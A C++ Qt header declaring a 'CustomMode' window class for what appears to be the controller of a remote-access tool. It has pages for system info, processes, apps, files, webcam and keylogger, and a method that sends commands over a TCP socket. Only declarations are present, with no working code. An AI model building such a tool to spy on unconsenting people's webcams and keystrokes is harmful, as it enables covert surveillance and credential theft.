#ifndef CUSTOMMODE_H
#define CUSTOMMODE_H
#include <QMainWindow>
#include "CustomMode_ui.h"
#include <QTcpSocket>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>
#include <QMessageBox>
#include <QInputDialog>
#include <QDir>
#include <QThread>
#include <QProgressDialog>
#include <QFileInfo>
#include <QStandardPaths>
#include <QDebug>
class CustomMode : public QMainWindow
{
    Q_OBJECT

public:
    explicit CustomMode(QWidget *parent = nullptr);
    ~CustomMode();

private slots:
    void showSystemPage();
    void showProcessesPage();
    void showAppsPage();
    void showFilesPage();
    void showWebcamPage();
    void showKeyloggerPage();

private:
    CustomModeUI *programUI;

    void sendCommand(CustomModeUI *ui, const QString &cmd, const QString &arg = "");
    void showErrorLine(QLineEdit *line, const QString &message);
    void appendOutput(QTextEdit *output, const QString &text);
};

#endif // CUSTOMMODE_H
